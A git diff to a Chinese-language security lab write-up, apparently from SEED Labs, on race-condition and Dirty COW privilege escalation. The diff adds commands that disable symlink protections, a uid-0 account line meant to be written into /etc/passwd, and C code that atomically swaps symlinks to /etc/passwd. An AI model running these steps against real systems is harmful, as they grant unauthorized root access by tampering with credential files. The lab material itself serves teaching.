@@ -42,6 +42,9 @@ sudo chown root vulp
 sudo chmod 4755 vulp
 
 # 关闭保护措施
+# for ubuntu 20.04
+sudo sysctl -w fs.protected_symlinks=0
+sudo sysctl fs.protected_regular=0
 # for ubuntu 16.04
 sudo sysctl -w fs.protected_symlinks=0
 # for ubuntu 12.04
@@ -51,7 +54,7 @@ sudo sysctl -w kernel.yama.protected_sticky_symlinks=0
 ## 2. 设置将要添加到/etc/passwd的用户行信息 (passwd_input)
 
 ```bash
-echo "test:U6aMy0Wojraho:0:0:test:/root:/bin/bash" > passwd_input
+echo "test:U6aMy0wojraho:0:0:test:/root:/bin/bash" > passwd_input
 ```
 
 ## 3. 设置攻击进程来不断更改链接的指向 (attack_process.c)
@@ -67,6 +70,27 @@ int main() {
 		
 		unlink("/tmp/XYZ");
 		symlink("/etc/passwd", "/tmp/XYZ");
+		usleep(1000);
+	}
+
+	return 0;
+}
+```
+
+也可以用这一版本的`attack_process_safe.c`，它使用 renameat2 系统调用来原子地调换链接，自身不存在竞态问题。
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <unistd.h>
+
+int main() {
+  unsigned int flags = RENAME_EXCHANGE;
+
+  unlink("/tmp/XYZ"); symlink("/dev/null", "/tmp/XYZ");
+  unlink("/tmp/ABC"); symlink("/etc/passwd", "/tmp/ABC");
+
+	while(1) {
+		renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
 		usleep(1000);
 	}
 
@@ -110,6 +134,7 @@ cat /etc/passwd
 ## 1. 添加一个测试用户testcow
 
 ```bash
+# 为了和攻击代码匹配，testcow需要是第二个非root普通用户，即id=1001
 sudo adduser testcow
 ```
 
@@ -187,3 +212,8 @@ void *madviseThread(void *arg)
 # 查看结果
 cat /etc/passwd
 ```
+
+# 参考资料
+
+- [SEEDLABS Race Condition](seedsecuritylabs.org/Labs_20.04/Files_cn/Race_Condition_cn.pdf)
+- [Dirty COW - (CVE-2016-5195) - Docker Container Escape](https://blog.paranoidsoftware.com/dirty-cow-cve-2016-5195-docker-container-escape/)
